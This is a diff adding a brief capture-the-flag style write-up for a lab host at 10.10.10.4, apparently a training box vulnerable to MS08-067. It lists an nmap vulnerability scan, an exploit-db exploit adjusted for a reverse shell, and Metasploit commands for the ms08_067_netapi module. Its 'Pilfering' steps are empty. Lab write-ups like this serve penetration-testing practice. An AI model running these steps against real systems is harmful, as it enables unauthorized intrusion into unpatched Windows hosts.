@@ -1,0 +1,26 @@
+# Non-Metasploit method.
+
+Step 1 (Enumeration)
+- nmap --script vuln -p 445 10.10.10.4 reveals a MS08-067 exploit vulnerability
+
+Step 2 (Foothold/ Priviledge escalation)
+- https://www.exploit-db.com/download/40279
+- Fix code above by changing the reverse shell used and adding python executable path at the top.
+- Run program specifing windows 2000 universal
+
+Step 3 (Pilfering)
+
+# Metasploit method.
+
+Step 1 (Enumeration)
+- nmap --script vuln -p 445 10.10.10.4 reveals a MS08-067 exploit vulnerability
+
+Step 2 (Exploit)
+- use exploit/windows/smb/ms08_067_netapi
+- set RHOST 10.10.10.4
+- set payload
+- run
+
+Exploit runs as administrator.
+
+Step 3 (Pilfering)
